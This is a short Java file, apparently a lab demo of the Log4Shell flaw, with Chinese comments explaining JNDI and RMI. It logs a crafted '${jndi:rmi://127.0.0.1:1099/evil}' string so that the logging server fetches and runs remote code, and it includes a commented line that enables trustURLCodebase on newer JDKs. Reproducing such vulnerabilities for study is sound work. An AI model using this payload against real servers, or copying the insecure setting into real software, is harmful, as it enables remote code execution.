package bug;

import com.aliyun.openservices.log.exception.LogException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class Server {

	private static final Logger logger = LogManager.getLogger();

	public static void main(String[] args) throws LogException {
		SLSDemo.sendLog();
		String name = "${java:runtime}";

		// RMI（Remote Method Invocation） 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口
		// JNDI (Java Naming and Directory
		// Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口
		// JNDI和RMI的主要关系是RMI注册的服务可以通过JNDIAPI访问。在讨论到Spring反序列化漏洞之前，先看看如果通过JNDI来调用RMI注册的服务。

		// 有些高版本jdk需要打开此行代码
		// System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
		logger.info("name:{}", name);
		// 模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码 同一台可以使用127.0.0.1
		String username = "${jndi:rmi://127.0.0.1:1099/evil}";
		// 正常打印业务日志
		logger.error("username:{}", username);

	}

}
